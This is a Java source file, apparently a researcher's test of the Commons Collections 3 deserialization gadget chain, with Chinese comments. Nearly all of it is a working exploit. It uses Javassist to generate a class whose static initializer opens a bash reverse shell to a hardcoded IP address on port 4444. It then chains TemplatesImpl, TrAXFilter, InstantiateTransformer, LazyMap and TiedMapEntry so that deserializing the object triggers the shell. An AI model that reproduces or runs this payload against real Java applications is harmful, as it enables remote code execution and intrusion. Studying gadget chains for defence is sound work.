package gadget.cc;

import util.ReflectionUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;


public class CC3Test {
    public static void main(String[] args) throws Exception {
        //使用Javassit新建一个含有static的类
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Squirt1e");
        String cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/139.9.134.169/4444 0>&1\"});";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        cc.writeFile();
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};

        //补充实例化新建类所需的条件
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        ReflectionUtils.setFieldValue(templates, "_bytecodes", targetByteCodes);
        ReflectionUtils.setFieldValue(templates, "_name", "Squirt1e");

        ChainedTransformer c = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        });

        HashMap map=new HashMap();
        Map lazyMap= LazyMap.decorate(map,new ConstantTransformer(1));//先放进去一个触发不了的,避免序列化的时候触发

        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,"Squirt1e");
        HashMap<Object,String> hashmap=new HashMap<Object,String>();
        hashmap.put(tiedMapEntry,"Squirt1e");
        map.remove("Squirt1e");

        // 将factory重新赋值为lazyMap从而触发factory.transform
        Class clazz=LazyMap.class;
        Field factory=clazz.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,c);
//        String encoder = Base64.getEncoder().encodeToString(serialize(hashmap));
//        System.out.println(encoder);
        unserialize();

    }
    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream aos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(aos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return aos.toByteArray();
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("CC3.bin"));
        objectInputStream.readObject();
    }
}
